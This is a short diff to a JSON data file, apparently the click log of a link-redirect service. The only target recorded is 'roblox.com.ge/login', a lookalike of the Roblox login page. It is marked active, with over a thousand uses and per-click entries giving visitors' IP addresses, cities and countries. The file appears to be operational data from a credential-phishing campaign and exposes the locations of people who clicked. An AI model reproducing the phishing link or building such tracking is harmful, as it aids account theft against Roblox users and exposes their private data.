@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1183,
+    "useCount": 1184,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9606,6 +9606,14 @@
         "ip": "103.188.86.250",
         "country": "Philippines",
         "city": "Tayabas",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777298378473,
+        "ip": "136.158.122.10",
+        "country": "Philippines",
+        "city": "Tarlac City",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
